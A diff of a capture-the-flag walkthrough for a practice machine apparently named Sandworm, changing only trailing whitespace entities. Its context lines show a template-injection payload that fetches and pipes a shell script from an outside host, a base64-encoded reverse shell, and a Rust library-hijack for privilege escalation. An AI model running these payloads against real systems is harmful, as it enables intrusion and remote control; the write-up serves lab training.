@@ -17,7 +17,7 @@ PORT    STATE SERVICE
 443/tcp open  https
 ```
 
-We have to add `ssa.htb` to our `/etc/hosts` file to visit the HTTPS site.&#x20;
+We have to add `ssa.htb` to our `/etc/hosts` file to visit the HTTPS site.
 
 ### Secret Spy Agency -> SSTI
 
@@ -55,7 +55,7 @@ uid          test123
 $ gpg --armor --export 31EA5FC83F24B3E99B87885ED6F62FD89D66C0B7
 ```
 
-Afterwards, we can input some encrypted message to verify that it has been signed properly.&#x20;
+Afterwards, we can input some encrypted message to verify that it has been signed properly.
 
 ```
 $ echo 'hello' | gpg --clear-sign
@@ -134,7 +134,7 @@ I tried to execute this, but it didn't work:
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('curl 10.10.14.3/shell.sh|bash').read() }}
 ```
 
-What works is a `base64` encoded bash reverse shell command since the UID of the key cannot have `>` or `<` characters.&#x20;
+What works is a `base64` encoded bash reverse shell command since the UID of the key cannot have `>` or `<` characters.
 
 ```
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzQ0NDQgMD4mMSAK | base64 -d | bash').read() }}
@@ -207,7 +207,7 @@ I ran a `pspy64` on the machine to view the processes that were running, and fou
 2023/06/20 02:44:01 CMD: UID=0    PID=7423   | /bin/sh -c sleep 10 && /root/Cleanup/clean_c.sh
 ```
 
-The source code for this application is in `/opt/tipnet/src/main.rs`.&#x20;
+The source code for this application is in `/opt/tipnet/src/main.rs`.
 
 ```rust
 extern crate logger;
@@ -222,7 +222,7 @@ use std::io;
 <TRUNCATED>
 ```
 
-It's a pretty long file, but it does nothing of interest. I noticed that this uses an external library called `logger`, which is located in the same directory as `tipnet`.&#x20;
+It's a pretty long file, but it does nothing of interest. I noticed that this uses an external library called `logger`, which is located in the same directory as `tipnet`.
 
 ```
 silentobserver@sandworm:/opt/crates/logger$ ls -la
@@ -237,9 +237,9 @@ drwxrwxr-x 2 atlas silentobserver  4096 May  4 17:12 src
 drwxrwxr-x 3 atlas silentobserver  4096 May  4 17:08 target
 ```
 
-The weird thing is, it seems that we are given write access over this directory. However, the `sudo` command runs `sudo -u atlas` before running the command, meaning that we don't get a `root` shell.&#x20;
+The weird thing is, it seems that we are given write access over this directory. However, the `sudo` command runs `sudo -u atlas` before running the command, meaning that we don't get a `root` shell.
 
-I still did it anyways because there was literally nothing else I could so. Append this code at the top of the function in `lib.rs`.&#x20;
+I still did it anyways because there was literally nothing else I could so. Append this code at the top of the function in `lib.rs`.
 
 ```rust
 use std::process::Command;
@@ -291,4 +291,4 @@ Then in another shell:
 
 <figure><img src="../../.gitbook/assets/image (2317).png" alt=""><figcaption></figcaption></figure>
 
-Rooted!&#x20;
+Rooted!
